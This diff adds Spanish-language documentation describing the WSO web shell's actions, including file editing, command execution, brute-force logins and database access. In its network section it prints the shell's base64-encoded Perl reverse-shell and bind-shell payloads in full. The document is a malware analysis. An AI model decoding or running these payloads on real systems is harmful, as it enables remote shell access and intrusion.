@@ -306,3 +306,76 @@ String length | `strlen`
 1. Ejecuta la función **`wsoFooter`**
 
 ## **`actionFileTools`**
+
+1. Ejecuta la función **`wsoHeader`**
+1. Muestra un editor de archivos que permite realizar las siguientes acciones:
+    1. Visualizar
+    1. Destacar
+    1. Modificar permisos
+    1. Editar
+    1. *hexdump*
+    1. Renombrar
+    1. *touch*
+1. Ejecuta la función **`wsoFooter`**
+
+
+## **`actionConsole`**
+1. Ejecuta la función **`wsoHeader`**
+1. Muestra un editor de texto que permite ejecutar líneas de comando con la función **`wsoEx`**
+    Genera una nueva función JavaScript que verifica el KeyDown para enviar los comandos por separado
+1. Ejecuta la función **`wsoFooter`**
+
+## **`actionSelfRemove`**
+1. Ejecuta la función **`wsoHeader`**
+1. Solicita una confirmación y ejecuta la función *unlink* sobre **_FILE_** para eliminar el archivo
+1. Ejecuta la función **`wsoFooter`**
+
+## **`actionBruteForce`**
+1. Ejecuta la función **`wsoHeader`**
+1. Ejecuta funciones de intentos de login Fuerza bruta de los siguientes tipos:
+    1. etc/passwd : reverse (login -> nigol)
+    1. dictionary
+    Y lo ejecuta sobre los siguientes servicios:
+    1. Mysql
+    1. Postgresql
+    1. FTP
+1. Ejecuta la función **`wsoFooter`**
+
+## **`actionSQL`**
+1. Define una clase llamada DbClass que contiene las siguientes funciones sobre base de datos:
+    1. connect
+    1. select db
+    1. query
+    1. fetch 
+    1. list db
+    1. list tables
+    1. throw error
+    1. set charset
+    1. laod file
+    1. dump
+
+1. Ejecuta la función **`wsoHeader`**
+1. Muestra un editor que puede llamar a las funciones anteriormente definidas
+1. Ejecuta la función **`wsoFooter`**
+
+## **`actionNetwork`**
+1. define 2 variables *back_connect_p* y *bind_port_p* con los siguientes caracteres:
+    > $back_connect_p = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZ
+GllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsN
+CiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3R
+vKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGV
+uKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNC
+nN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
+    > $bind_port_p = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDE
+pOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZ
+GllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFM
+sc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBk
+aWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQ
+oJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj
+4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGV
+jdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
+1. Ejecuta la función **`wsoHeader`**
+1. Realiza las siguientes funciones ejecutando el código de las variables arriba definidas:
+    1. Bind port to /bin/sh [perl]
+    1. Back-connect [perl]
+1. Ejecuta la función **`wsoFooter`**
